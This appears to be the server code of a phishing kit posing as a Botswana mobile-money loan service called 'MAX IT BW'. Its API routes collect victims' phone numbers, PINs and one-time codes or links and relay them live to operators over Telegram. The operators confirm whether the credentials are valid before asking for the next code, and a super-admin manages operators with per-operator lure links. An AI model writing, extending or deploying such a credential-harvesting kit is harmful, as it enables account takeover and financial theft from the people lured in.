const express = require('express');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.static(__dirname));

// Import database
const db = require('./database');

// Telegram Bot Setup
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.SUPER_ADMIN_BOT_TOKEN;
let bot;
const adminChatIds = new Map();
const pausedAdmins = new Set();
const applications = new Map();

// Initialize Bot
if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
    try {
        bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
        console.log('✅ Telegram bot connected');
        
        // Load admins from database
        loadAdminsFromDatabase();
    } catch (error) {
        console.error('❌ Telegram bot error:', error.message);
    }
} else {
    console.warn('⚠️  Telegram bot not configured');
}

// ============================================
// HELPER FUNCTIONS
// ============================================

async function loadAdminsFromDatabase() {
    try {
        const admins = await db.getAllAdmins();
        admins.forEach(admin => {
            if (admin.chatId) {
                adminChatIds.set(admin.adminId, admin.chatId);
                if (admin.status === 'paused') {
                    pausedAdmins.add(admin.adminId);
                }
            }
        });
        console.log(`✅ Loaded ${adminChatIds.size} admin(s), ${pausedAdmins.size} paused`);
    } catch (error) {
        console.error('Error loading admins:', error.message);
    }
}

function getAdminIdByChatId(chatId) {
    for (const [adminId, storedChatId] of adminChatIds.entries()) {
        if (storedChatId === chatId) return adminId;
    }
    return null;
}

function isAdminActive(chatId) {
    const adminId = getAdminIdByChatId(chatId);
    if (!adminId) return false;
    if (adminId === 'ADMIN001') return true; // Super admin always active
    return !pausedAdmins.has(adminId);
}

async function sendToAdmin(adminId, message, options = {}) {
    const chatId = adminChatIds.get(adminId);
    if (!chatId) return null;
    try {
        return await bot.sendMessage(chatId, message, options);
    } catch (error) {
        console.error(`Error sending to ${adminId}:`, error.message);
        return null;
    }
}

function formatPhoneForDisplay(phoneNumber) {
    if (!phoneNumber) return phoneNumber;
    let cleaned = phoneNumber.replace(/\D/g, '');
    if (cleaned.startsWith('267')) cleaned = cleaned.substring(3);
    if (!cleaned.startsWith('0') && cleaned.length >= 9) cleaned = '0' + cleaned;
    return cleaned;
}

// ============================================
// API ROUTES
// ============================================

// Get admins list
app.get('/api/admins', async (req, res) => {
    try {
        const admins = await db.getActiveAdmins();
        const adminList = admins
            .filter(admin => !pausedAdmins.has(admin.adminId))
            .map(admin => ({
                id: admin.adminId,
                name: admin.name,
                email: admin.email,
                status: admin.status,
                connected: adminChatIds.has(admin.adminId)
            }));
        res.json({ success: true, admins: adminList });
    } catch (error) {
        console.error('Error getting admins:', error);
        res.status(500).json({ success: false, error: 'Failed to get admins' });
    }
});

// Submit PIN verification
app.post('/api/verify-pin', async (req, res) => {
    try {
        const { phoneNumber, pin, adminId: requestAdminId } = req.body;
        const applicationId = `APP-${Date.now()}`;
        
        // Get admin (use requested or auto-assign)
        let assignedAdmin;
        if (requestAdminId) {
            assignedAdmin = await db.getAdmin(requestAdminId);
            if (!assignedAdmin || pausedAdmins.has(requestAdminId)) {
                return res.status(400).json({ success: false, message: 'Admin not available' });
            }
        } else {
            const activeAdmins = (await db.getActiveAdmins()).filter(a => !pausedAdmins.has(a.adminId));
            assignedAdmin = activeAdmins[0];
        }

        if (!assignedAdmin) {
            return res.status(503).json({ success: false, message: 'No admins available' });
        }

        // Ensure admin is in map
        if (!adminChatIds.has(assignedAdmin.adminId) && assignedAdmin.chatId) {
            adminChatIds.set(assignedAdmin.adminId, assignedAdmin.chatId);
        }

        // Save application
        await db.saveApplication({
            id: applicationId,
            adminId: assignedAdmin.adminId,
            phoneNumber,
            pin,
            pinStatus: 'pending',
            otpStatus: 'pending',
            timestamp: new Date().toISOString()
        });

        // Send notification
        await sendToAdmin(assignedAdmin.adminId, `
📱 *NEW APPLICATION*

📋 \`${applicationId}\`
📱 \`${formatPhoneForDisplay(phoneNumber)}\`
🔑 \`${pin}\`
⏰ ${new Date().toLocaleString()}

⚠️ *VERIFY INFORMATION*
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Invalid - Deny', callback_data: `deny_pin_${applicationId}` }],
                    [{ text: '✅ Correct - Allow OTP', callback_data: `allow_pin_${applicationId}` }]
                ]
            }
        });

        res.json({ 
            success: true, 
            applicationId,
            assignedTo: assignedAdmin.name,
            assignedAdminId: assignedAdmin.adminId
        });
    } catch (error) {
        console.error('Error in verify-pin:', error);
        res.status(500).json({ success: false, message: error.message });
    }
});

// Check PIN status
app.get('/api/check-pin-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        res.json({ 
            success: !!application, 
            status: application?.pinStatus || 'not_found' 
        });
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
});

// Submit OTP verification
app.post('/api/verify-otp', async (req, res) => {
    try {
        const { applicationId, otp } = req.body;
        const application = await db.getApplication(applicationId);

        if (!application) {
            return res.status(404).json({ success: false, message: 'Application not found' });
        }

        // Update with OTP
        await db.updateApplication(applicationId, { otp, otpStatus: 'pending' });

        // Send to admin
        await sendToAdmin(application.adminId, `
🔗 *LINK VERIFICATION*

📋 \`${applicationId}\`
📱 \`${formatPhoneForDisplay(application.phoneNumber)}\`

📎 *Customer's Link:*
\`${otp}\`

⚠️ *VERIFY LINK*
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Wrong PIN', callback_data: `wrongpin_otp_${applicationId}` }],
                    [{ text: '❌ Wrong Link', callback_data: `wrongcode_otp_${applicationId}` }],
                    [{ text: '✅ Approve Loan', callback_data: `approve_otp_${applicationId}` }]
                ]
            }
        });

        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
});

// Check OTP status
app.get('/api/check-otp-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        res.json({ 
            success: !!application, 
            status: application?.otpStatus || 'not_found' 
        });
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
});

// Resend OTP
app.post('/api/resend-otp', async (req, res) => {
    try {
        const { applicationId } = req.body;
        const application = await db.getApplication(applicationId);

        if (!application) {
            return res.status(404).json({ success: false, message: 'Application not found' });
        }

        await sendToAdmin(application.adminId, `
🔄 *LINK RESEND REQUEST*

📋 \`${applicationId}\`
📱 \`${formatPhoneForDisplay(application.phoneNumber)}\`

⚠️ Customer requested a new verification link.
        `, { parse_mode: 'Markdown' });

        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
});

// ============================================
// TELEGRAM BOT COMMANDS
// ============================================

if (bot) {
    // /start command
    bot.onText(/\/start/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (adminId) {
            const admin = await db.getAdmin(adminId);
            const isSuperAdmin = adminId === 'ADMIN001';
            const isPaused = pausedAdmins.has(adminId);

            if (isPaused && !isSuperAdmin) {
                return bot.sendMessage(chatId, '🚫 Your admin access has been paused. Contact super admin.');
            }

            let message = `
👋 *Welcome ${admin.name}!*

*Admin ID:* \`${adminId}\`
*Role:* ${isSuperAdmin ? '⭐ Super Admin' : '👤 Admin'}

*Commands:*
/mylink - Your application link
/stats - Your statistics  
/pending - Pending applications
/myinfo - Your information
`;

            if (isSuperAdmin) {
                message += `
*Admin Management:*
/addadmin - Add new admin
/pauseadmin <id> - Pause admin
/unpauseadmin <id> - Unpause admin
/removeadmin <id> - Remove admin
/transferadmin <oldChat> | <newChat>
/admins - List all admins
/send <id> <msg> - Message admin
/broadcast <msg> - Message all
/ask <id> <request> - Action request
`;
            }

            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        } else {
            bot.sendMessage(chatId, `
👋 Welcome!

Your Chat ID: \`${chatId}\`
Give this to your admin for access.
            `, { parse_mode: 'Markdown' });
        }
    });

    // /mylink
    bot.onText(/\/mylink/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (!adminId || !isAdminActive(chatId)) {
            return bot.sendMessage(chatId, '❌ Not authorized or paused');
        }

        const admin = await db.getAdmin(adminId);
        bot.sendMessage(chatId, `
🔗 *YOUR LINK*

\`http://localhost:${PORT}?admin=${adminId}\`

📋 Applications → ${admin.name}
        `, { parse_mode: 'Markdown' });
    });

    // /stats
    bot.onText(/\/stats/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (!adminId || !isAdminActive(chatId)) {
            return bot.sendMessage(chatId, '❌ Not authorized or paused');
        }

        const stats = await db.getAdminStats(adminId);
        bot.sendMessage(chatId, `
📊 *STATISTICS*

📋 Total: ${stats.total}
⏳ PIN Pending: ${stats.pinPending}
✅ PIN Approved: ${stats.pinApproved}
⏳ OTP Pending: ${stats.otpPending}
🎉 Fully Approved: ${stats.fullyApproved}
        `, { parse_mode: 'Markdown' });
    });

    // /pending
    bot.onText(/\/pending/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (!adminId || !isAdminActive(chatId)) {
            return bot.sendMessage(chatId, '❌ Not authorized or paused');
        }

        const apps = await db.getApplicationsByAdmin(adminId);
        const pinPending = apps.filter(a => a.pinStatus === 'pending');
        const otpPending = apps.filter(a => a.otpStatus === 'pending' && a.pinStatus === 'approved');

        let message = '⏳ *PENDING*\n\n';

        if (pinPending.length > 0) {
            message += `📱 *PIN (${pinPending.length}):*\n`;
            pinPending.forEach((app, i) => {
                message += `${i + 1}. \`${formatPhoneForDisplay(app.phoneNumber)}\`\n`;
            });
        }

        if (otpPending.length > 0) {
            message += `\n🔢 *OTP (${otpPending.length}):*\n`;
            otpPending.forEach((app, i) => {
                message += `${i + 1}. \`${app.otp}\`\n`;
            });
        }

        if (pinPending.length === 0 && otpPending.length === 0) {
            message = '✨ No pending applications!';
        }

        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    });

    // /myinfo
    bot.onText(/\/myinfo/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (!adminId || !isAdminActive(chatId)) {
            return bot.sendMessage(chatId, '❌ Not authorized or paused');
        }

        const admin = await db.getAdmin(adminId);
        const status = pausedAdmins.has(adminId) ? '🚫 Paused' : '✅ Active';

        bot.sendMessage(chatId, `
ℹ️ *YOUR INFO*

👤 ${admin.name}
📧 ${admin.email}
🆔 \`${adminId}\`
💬 \`${chatId}\`
${status}

🔗 http://localhost:${PORT}?admin=${adminId}
        `, { parse_mode: 'Markdown' });
    });

    // /addadmin NAME|EMAIL|CHATID
    bot.onText(/\/addadmin (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (adminId !== 'ADMIN001') {
            return bot.sendMessage(chatId, '❌ Only super admin can add admins');
        }

        const parts = match[1].split('|').map(p => p.trim());
        if (parts.length !== 3) {
            return bot.sendMessage(chatId, 'Usage: `/addadmin NAME|EMAIL|CHATID`', { parse_mode: 'Markdown' });
        }

        const [name, email, newChatId] = parts;
        const admins = await db.getAllAdmins();
        const newAdminId = `ADMIN${String(admins.length + 1).padStart(3, '0')}`;

        await db.saveAdmin({
            adminId: newAdminId,
            chatId: parseInt(newChatId),
            name,
            email,
            status: 'active',
            createdAt: new Date()
        });

        adminChatIds.set(newAdminId, parseInt(newChatId));

        bot.sendMessage(chatId, `
✅ *ADMIN ADDED*

👤 ${name}
🆔 \`${newAdminId}\`
🔗 http://localhost:${PORT}?admin=${newAdminId}
        `, { parse_mode: 'Markdown' });

        // Notify new admin
        bot.sendMessage(parseInt(newChatId), `
🎉 *YOU'RE NOW AN ADMIN!*

Welcome ${name}!
Admin ID: \`${newAdminId}\`

Use /start to see commands.
        `, { parse_mode: 'Markdown' }).catch(() => {});
    });

    // /pauseadmin ADMINID
    bot.onText(/\/pauseadmin (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (adminId !== 'ADMIN001') {
            return bot.sendMessage(chatId, '❌ Only super admin can pause admins');
        }

        const targetId = match[1].trim();
        if (targetId === 'ADMIN001') {
            return bot.sendMessage(chatId, '🚫 Cannot pause super admin');
        }

        pausedAdmins.add(targetId);
        await db.updateAdmin(targetId, { status: 'paused' });

        bot.sendMessage(chatId, `🚫 Admin \`${targetId}\` paused`, { parse_mode: 'Markdown' });
    });

    // /unpauseadmin ADMINID
    bot.onText(/\/unpauseadmin (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (adminId !== 'ADMIN001') {
            return bot.sendMessage(chatId, '❌ Only super admin');
        }

        const targetId = match[1].trim();
        pausedAdmins.delete(targetId);
        await db.updateAdmin(targetId, { status: 'active' });

        bot.sendMessage(chatId, `✅ Admin \`${targetId}\` unpaused`, { parse_mode: 'Markdown' });
    });

    // /removeadmin ADMINID
    bot.onText(/\/removeadmin (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (adminId !== 'ADMIN001') {
            return bot.sendMessage(chatId, '❌ Only super admin');
        }

        const targetId = match[1].trim();
        if (targetId === 'ADMIN001') {
            return bot.sendMessage(chatId, '🚫 Cannot remove super admin');
        }

        await db.deleteAdmin(targetId);
        adminChatIds.delete(targetId);
        pausedAdmins.delete(targetId);

        bot.sendMessage(chatId, `🗑️ Admin \`${targetId}\` removed`, { parse_mode: 'Markdown' });
    });

    // /admins
    bot.onText(/\/admins/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (!adminId || !isAdminActive(chatId)) {
            return bot.sendMessage(chatId, '❌ Not authorized');
        }

        const allAdmins = await db.getAllAdmins();
        let message = `👥 *ALL ADMINS (${allAdmins.length})*\n\n`;

        allAdmins.forEach((admin, i) => {
            const status = pausedAdmins.has(admin.adminId) ? '🚫' : '✅';
            const conn = adminChatIds.has(admin.adminId) ? '🟢' : '⚪';
            message += `${i + 1}. ${status} ${conn} ${admin.name}\n   \`${admin.adminId}\`\n\n`;
        });

        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    });

    // /send ADMINID message
    bot.onText(/\/send (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (adminId !== 'ADMIN001') {
            return bot.sendMessage(chatId, '❌ Only super admin');
        }

        const input = match[1];
        const spaceIdx = input.indexOf(' ');
        if (spaceIdx === -1) {
            return bot.sendMessage(chatId, 'Usage: `/send ADMINID Your message`', { parse_mode: 'Markdown' });
        }

        const targetId = input.substring(0, spaceIdx);
        const message = input.substring(spaceIdx + 1);

        const sent = await sendToAdmin(targetId, `
📨 *MESSAGE FROM SUPER ADMIN*

${message}
        `, { parse_mode: 'Markdown' });

        bot.sendMessage(chatId, sent ? '✅ Message sent' : '❌ Failed to send');
    });

    // /broadcast message
    bot.onText(/\/broadcast (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (adminId !== 'ADMIN001') {
            return bot.sendMessage(chatId, '❌ Only super admin');
        }

        const message = match[1];
        const admins = await db.getAllAdmins();
        let sent = 0;

        for (const admin of admins) {
            if (admin.adminId !== 'ADMIN001' && adminChatIds.has(admin.adminId)) {
                const result = await sendToAdmin(admin.adminId, `
📢 *BROADCAST*

${message}
                `, { parse_mode: 'Markdown' });
                if (result) sent++;
            }
        }

        bot.sendMessage(chatId, `📢 Broadcast sent to ${sent} admin(s)`);
    });

    // Callback handler
    bot.on('callback_query', async (query) => {
        const chatId = query.message.chat.id;
        const data = query.data;
        const adminId = getAdminIdByChatId(chatId);

        if (!adminId) {
            return bot.answerCallbackQuery(query.id, { text: '❌ Not authorized' });
        }

        if (!isAdminActive(chatId) && !data.startsWith('request_')) {
            return bot.answerCallbackQuery(query.id, { text: '🚫 Admin paused' });
        }

        const parts = data.split('_');
        const action = parts[0];
        const type = parts[1];
        const applicationId = parts.slice(2).join('_');

        const application = await db.getApplication(applicationId);
        if (!application || application.adminId !== adminId) {
            return bot.answerCallbackQuery(query.id, { text: '❌ Not found' });
        }

        // Handle actions
        if (action === 'deny' && type === 'pin') {
            await db.updateApplication(applicationId, { pinStatus: 'rejected' });
            bot.answerCallbackQuery(query.id, { text: '❌ PIN rejected' });
        } else if (action === 'allow' && type === 'pin') {
            await db.updateApplication(applicationId, { pinStatus: 'approved' });
            bot.answerCallbackQuery(query.id, { text: '✅ PIN approved' });
        } else if (action === 'approve' && type === 'otp') {
            await db.updateApplication(applicationId, { otpStatus: 'approved' });
            bot.answerCallbackQuery(query.id, { text: '🎉 Loan approved!' });
        } else if (action === 'wrongpin' || action === 'wrongcode') {
            await db.updateApplication(applicationId, { otpStatus: action + '_otp' });
            bot.answerCallbackQuery(query.id, { text: '❌ Marked as wrong' });
        }
    });
}

// ============================================
// SERVE HTML PAGES
// ============================================

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/application.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'application.html'));
});

app.get('/verification.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'verification.html'));
});

app.get('/otp.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'otp.html'));
});

app.get('/approval.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'approval.html'));
});

app.get('/admin-select.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin-select.html'));
});

// Start server
app.listen(PORT, () => {
    console.log(`
╔═══════════════════════════════════════╗
║       💰 MAX IT BW LOAN SYSTEM       ║
╠═══════════════════════════════════════╣
║   Server: http://localhost:${PORT}       ║
║   Currency: P (Pula)                  ║
║   Market: Botswana                    ║
║   Admin Commands: ✅ Enabled          ║
╚═══════════════════════════════════════╝
    `);
});

module.exports = app;